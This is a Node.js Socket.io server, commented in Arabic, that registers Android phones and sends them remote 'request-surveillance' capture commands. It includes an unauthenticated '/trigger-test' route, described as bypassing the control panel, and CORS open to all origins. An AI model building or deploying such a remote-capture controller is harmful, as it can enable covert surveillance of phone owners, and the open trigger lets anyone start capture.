const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);

// إعداد Socket.io للسماح بالاتصال
const io = new Server(server, {
  cors: { origin: '*' }
});

app.get('/', (req, res) => {
  res.send('Surveillance Signaling Server is Running Live!');
});

// مسار اختبار سريع عبر المتصفح لتجاوز لوحة التحكم
app.get('/trigger-test', (req, res) => {
  const sockets = Array.from(io.sockets.sockets.values());
  const targetSocket = sockets.find(s => s.data && s.data.deviceName);
  
  if (targetSocket) {
    targetSocket.emit('request-surveillance');
    res.send(`تم إرسال أمر الالتقاط بنجاح إلى الجهاز: ${targetSocket.data.deviceName}`);
  } else {
    res.status(400).send("لا يوجد أي هاتف متصل بالسيرفر حالياً! تأكد من فتح التطبيق على الهاتف.");
  }
});

io.on('connection', (socket) => {
  console.log('جهاز متصل جديد:', socket.id);

  // استقبال حدث تسجيل الجهاز القادم من تطبيق الأندرويد
  socket.on('register-device', (deviceName) => {
    socket.data.deviceName = deviceName;
    console.log(`تم تسجيل الجهاز بنجاح: ${deviceName} بمعرف الاتصال: ${socket.id}`);
  });

  // إرسال أمر المراقبة إلى التطبيق المستهدف عند الطلب
  socket.on('trigger-surveillance', (targetSocketId) => {
    io.to(targetSocketId).emit('request-surveillance');
    console.log(`تم إرسال أمر المراقبة للجهاز: ${targetSocketId}`);
  });

  socket.on('disconnect', () => {
    console.log('جهاز قطع الاتصال:', socket.id);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`السيرفر يعمل الآن بنجاح على المنفذ: ${PORT}`);
});
